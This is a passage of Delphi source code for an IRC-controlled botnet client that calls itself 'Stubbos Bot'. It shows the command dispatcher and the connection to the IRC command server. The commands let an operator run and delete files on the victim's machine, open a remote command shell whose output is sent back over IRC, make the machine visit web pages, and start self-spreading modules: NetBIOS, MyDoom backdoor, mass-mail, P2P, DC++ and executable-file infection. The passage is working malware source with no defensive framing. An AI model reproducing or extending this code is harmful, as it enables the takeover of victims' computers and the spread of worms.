                             ShellExecute(0, 'open', pChar(Buf), NIL, NIL, SW_SHOW);
                             Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Execute] Executed Successfully'#10
                           End Else
                             Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Execute] Error: File Doesnt Exist'#10;

                           SendData(Buf, IsChat, tempSock);
                         End;

                      // Delete a file
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_DELETE) Then
                      Begin
                        Buf := IRC.RecvText;
                        Delete(Buf, 1, Length(BOT_PREFIX) + Length(BOT_COMMAND_EXECUTE) + 1);

                        If (FileExists(Buf)) Then
                        Begin
                          If (DeleteFile(pChar(Buf))) Then
                            Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Delete] Deleted Successfully'#10
                          Else
                            BUf := 'PRIVMSG ' + IRC.FromChan + ' :[Delete] Error: Cant delete file'#10;
                        End Else
                          Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Delete] Error: File Doesnt Exist'#10;

                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Uninstall
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_UNINSTALL) Then
                      Begin
                        DoUninstall;

                        Buf := 'QUIT :Uninstalled! Stubbos Bot!'#10;
                        SendData(Buf, IsChat, tempSock);

                        Sleep(800);
                        ExitProcess(0);
                      End;

                      // Change nick
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_NICK) Then
                      Begin
                        ReplaceStr('%rand%', IntToStr(Random($FFFFFFFF)), IRC.Params[4]);
                        ReplaceStr('%host%', GetLocalName, IRC.Params[4]);
                        SendData('NICK '+IRC.Params[4]+#10, False, Sock);
                      End;

                      // Join Channel
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_JOIN) Then
                        SendData('JOIN '+IRC.Params[4]+' '+IRC.Params[5]+#10, False, Sock);

                      // Part Channel
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_PART) Then
                        SendData('PART '+IRC.Params[4]+#10, False, Sock);

                      // Set Mode
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_MODE) Then
                      Begin
                        Backup := IRC.RecvText;
                        Delete(Backup, 1, Pos(' ', Backup));

                        If (Copy(Backup, 1, 1) = ' ') Then
                          Delete(Backup, 1, 1);

                        Buf := 'MODE ' + Backup + #10;
                        SendData(Buf, False, Sock);
                      End;

                      // Cycle Channel
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_CYCLE) Then
                        SendData('PART ' + IRC.FromChan + #10 +
                                 'JOIN ' + IRC.FromChan + ' ' + Key + #10,
                                 False, Sock);

                      // Resolve Hostname
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_DNS) Then
                        SendData('PRIVMSG ' + IRC.FromChan + ' :Resolved (' + IRC.Params[4] + ') to [' + ResolveIP(IRC.Params[4]) + ']'#10, False, Sock);

                      // Run Script
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_RUNSCRIPT) Then
                      Begin
                        Buf := IRC.RecvText;
                        Delete(Buf, 1, Length(BOT_COMMAND_RUNSCRIPT) + Length(BOT_PREFIX) + 1);

                        If (Pos(#13, Buf) > 0) Then Delete(Buf, Pos(#13, Buf), 1);
                        If (Pos(#10, Buf) > 0) Then Delete(Buf, Pos(#10, Buf), 1);

                        If (FileExists(Buf)) Then
                          RunScript(Buf)
                        Else If (FileExists(GetDirectory(BOT_PLACESCRIPT) + BOT_SCRIPTDIR + '\' + BUF)) Then
                          RunScript(Buf);
                      End;

                      // Pay a visit somewhere.
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_VISIT) Then
                      Begin
                        Backup := IRC.Params[6];
                        If (Backup = '') Then
                          VisitPage(IRC.Params[4], IRC.Params[5], FALSE)
                        Else If (NOT IRC.IsNumeric(Backup)) Then
                          VisitPage(IRC.Params[4], IRC.Params[5], FALSE)
                        Else
                          VisitPage(IRC.Params[4], IRC.Params[5], Boolean(Integer(StrToInt(IRC.Params[6]))))
                      End;

                      // Remote Shell
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_REMOTECMD) Then
                      Begin
                        Buf := IRC.RecvText;
                        Delete(Buf, 1, Pos(' ', Buf) -1);

                        If (Copy(Buf, 1, 1) = ' ') Then
                          Delete(Buf, 1, 1);

                        If (Buf <> '') Then
                        Begin
                          Backup := RunDosInCap(Buf);

                          While (Pos(#10, Backup) > 0) Do
                          Begin
                            Buf := Copy(Backup, 1, Pos(#10, Backup) -1);
                            Backup := Copy(Backup, Pos(#10, Backup) +1, Length(Backup));

                            ReplaceStr(#32, #0160, Buf);
                            Buf := 'PRIVMSG ' + IRC.FromNick + ' :' + Buf + #10;

                            SendData(Buf, IsChat, tempSock);
                            Sleep(800);
                          End;
                        End;
                      End;

                      // Start Spreaders
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_STARTSPREADER) Then
                      Begin
                        {$IFDEF BOT_NETBIOS}
                          StartNetBios(50);
                        {$ENDIF}
                        {$IFDEF BOT_MYDOOM}
                          StartMyDoom(50);
                        {$ENDIF}
                        {$IFDEF BOT_DCPP}
                          StartDCPP;
                        {$ENDIF}
                        {$IFDEF BOT_MASSMAIL}
                          StartMassMail;
                        {$ENDIF}
                        {$IFDEF BOT_PE}
                          StartInfector;
                        {$ENDIF}
                        {$IFDEF BOT_P2P}
                          StartP2P;
                        {$ENDIF}
                        {$IFDEF BOT_IRC}
                          StartIRC;
                        {$ENDIF}
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Spread] Started.'#10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Stop Spreaders
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_STOPSPREADER) Then
                      Begin
                        {$IFDEF BOT_NETBIOS}
                          StopNetBios;
                        {$ENDIF}
                        {$IFDEF BOT_MYDOOM}
                          StopMyDoom;
                        {$ENDIF}
                        {$IFDEF BOT_DCPP}
                          StartDCPP;
                        {$ENDIF}
                        {$IFDEF BOT_MASSMAIL}
                          StopMassMail;
                        {$ENDIF}
                        {$IFDEF BOT_PE}
                          StopInfector;
                        {$ENDIF}
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :[Spread] Stopped.'#10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                      // Spreader Bot
                      If (BotCommand = BOT_PREFIX + BOT_COMMAND_INFOSPREADER) Then
                      Begin
                        Buf := '';
                        {$IFDEF BOT_NETBIOS}  Buf := Buf + '[NB : '+FixLength(IntToStr(SPREADER_NETBIOS ),5)+'] '; {$ENDIF}
                        {$IFDEF BOT_MYDOOM}   Buf := Buf + '[MD : '+FixLength(IntToStr(SPREADER_MYDOOM  ),5)+'] '; {$ENDIF}
                        {$IFDEF BOT_DCPP}     Buf := Buf + '[DC+: '+FixLength(IntToStr(SPREADER_DCPP    ),5)+'] '; {$ENDIF}
                        {$IFDEF BOT_MASSMAIL} Buf := Buf + '[MM : '+FixLength(IntToStr(SPREADER_MASSMAIL),5)+'] '; {$ENDIF}
                        {$IFDEF BOT_PE}       Buf := Buf + '[PE : '+FixLength(IntToStr(SPREADER_PE      ),5)+'] '; {$ENDIF}
                        {$IFDEF BOT_P2P}      Buf := Buf + '[P2P: '+FixLength(IntToStr(SPREADER_P2P     ),5)+'] '; {$ENDIF}
                        {$IFDEF BOT_IRC}      Buf := Buf + '[IRC: '+FixLength(IntToStr(SPREADER_IRC     ),5)+'] '; {$ENDIF}
                        Buf := 'PRIVMSG ' + IRC.FromChan + ' :' + Buf + #10;
                        SendData(Buf, IsChat, tempSock);
                      End;

                  End;
              End;
          End;
      End;
  End;
End;

Procedure tSock.DoCommando;
Var
  Buffer        :Array[0..6000] Of Char;
  Data          :String;
Begin
  ZeroMemory(@Buffer, SizeOf(Buffer));
  {$IFDEF SHOW_OUTPUT} WriteLn('Waiting for incomming data.'); {$ENDIF}
  While (IRC.ReceiveData) Do
  Begin
    Data := '';
    ZeroMemory(@Buffer, SizeOf(Buffer));
    Recv(Sock, Buffer, SizeOf(Buffer), 0);
    Data := String(Buffer);
    ZeroMemory(@Buffer, SizeOf(Buffer));
    {$IFDEF SHOW_OUTPUT} WriteLn('>> ['+IntToStr(Length(Data))+']: '+Data); {$ENDIF}
    {$IFDEF SHOW_OUTPUT} WriteLn; {$ENDIF}
    IsChat := False;
    ReadCommando(Data, Buffer, Sock);

    Data := '';
    ZeroMemory(@Buffer, SizeOf(Buffer));
  End;
End;

Procedure tSock.SendInfo;
Var
  Data: String;
Begin
  Randomize;
  If (Nick = '') Then Nick := RandIRCBot;

  ReplaceStr('%rand%', IntToStr(Random($FFFFFFFF)), Nick);
  ReplaceStr('%host%', GetLocalName, Nick);

  Data := 'USER '+Nick+' "'+Nick+IntToStr(Random(999))+'" "'+ServerN+'" :'+nick+#10;
  Send(Sock, Data[1], Length(Data), 0);
  Data := 'NICK '+Nick+#10;
  Send(Sock, Data[1], Length(Data), 0);
End;


Function  tSock.Connect;
Begin
  {$IFDEF SHOW_OUTPUT} WriteLn('Trying to connect.'); {$ENDIF}
  Result := False;
  Sock := Socket(AF_INET, SOCK_STREAM, 0);
  If (Sock = INVALID_SOCKET) Then Exit;

  Addr.sin_family := AF_INET;
  Addr.sin_port := hTons(Port);
  Addr.sin_addr.S_addr := inet_addr(pchar(server));

  If (Winsock.Connect(Sock, Addr, SizeOf(Addr)) = ERROR_SUCCESS) Then
  Begin
    {$IFDEF SHOW_OUTPUT} WriteLn('Established a connection.'); {$ENDIF}
    Result := True;
    SendInfo;
    IRC.Sock := Sock;
    If Not (IsSpy) And Not (Clone) Then
      DefaultSock := Sock;
    DoCommando;
  End;
  {$IFDEF SHOW_OUTPUT} WriteLn('Connection lost.'); {$ENDIF}
  CloseSocket(Sock);
End;

Function  tSock.StartUp: Bool;
Begin
  Servern := Server;
  Server := ResolveIP(Server);
  {$IFDEF SHOW_OUTPUT} WriteLn(ServerN+' Resolved To '+Server); {$ENDIF}
  WSAStartUp(MakeWord(2,1), WSA);
    IRC := tIRC.Create;
    {$IFDEF BOT_LOG_IRCNAMES}
      IRC.SeenNicks := RandIRCBotN;
    {$ENDIF}
    IRC.LoggedIn := False;
    IRC.Silence := False;
    Result := Connect;
    IRC.Free;
  WSACleanUp;
End;

Function  tIRC.IsNumeric(Str : String): Bool;
Var
  I: Integer;
  N: String;
Begin
  Result := True;
  N := '0123456789';
  For I := 1 To Length(Str) Do
    If (Pos(Str[I], N) = 0) Then Result := False;
End;

Procedure tIRC.SplitParam(Data: String);
Var
  I     :Integer;
  Temp  :String;
Begin
  I     := 0;
  FillChar(Params, 9000, #0);
  While (Pos(' ', Data) > 0) or (i >= 9000) Do
  Begin
    Temp := Copy(Data, 1, Pos(' ', Data)-1);
    Data := Copy(Data, Pos(' ', Data)+1, Length(Data));
    If (Temp <> '') Then
    Begin
      Params[I] := Temp;
      Inc(I);
    End;
  End;
  If (Data <> '') Then
  Begin
    If (Pos(#10, Data) > 0) Then Delete(Data, Pos(#10, Data), 1);
    If (Pos(#13, Data) > 0) Then Delete(Data, Pos(#13, Data), 1);
    Params[I] := Data;
  End;
End;

Procedure tIRC.ParseInfo(Data: String);
Var
  Temp          :String;
Begin
  SplitParam(Data);
  IsCommand := False;

  // Nick, Host, Chan
  Temp := Params[0];
  If (Pos('@', Temp) > 0) Then
  Begin
    FromNick := Copy(Temp, 2, Pos('!', Temp)-2);
    FromHost := Copy(Temp, Pos('!', Temp)+1, Length(Temp));
    {$IFDEF BOT_LOG_IRCNAMES}
      DoIKnowHim(FromNick);
    {$ENDIF}
  End;

  If (Params[2] <> '') Then
    If (Params[2][1] = '#') Then
      FromChan := Params[2];

  // Commands
  If (IsNumeric(Params[1])) Then
  Begin
    Commando := Params[1];
    IsCommand := True;
  End Else
    If (Params[1] = 'PRIVMSG') Then
    Begin
      RecvText := Copy(Data, Pos(Params[2], Data), Length(Data));
      RecvText := Copy(RecvText, Pos(':', RecvText)+1, Length(RecvText));
      If (Pos(#10, RecvText) > 0) Then Delete(RecvText, Pos(#10, RecvText), 1);
      If (Pos(#13, RecvText) > 0) Then Delete(RecvText, Pos(#13, RecvText), 1);
    End;
End;

Function tIRC.ReceiveData: Bool;
Var
  TimeOut       :TimeVal;
  FD_Struct     :TFDSet;
Begin
  TimeOut.tv_sec := 240;
  TimeOut.tv_usec := 0;

  FD_ZERO(FD_Struct);
  FD_SET (Sock, FD_Struct);

  If (Select(0, @FD_Struct, NIL, NIL, @TimeOut) <= 0) Then
  Begin
    CloseSocket(Sock);
    Result := False;
    Exit;
  End;
  Result := True;
End;

end.
 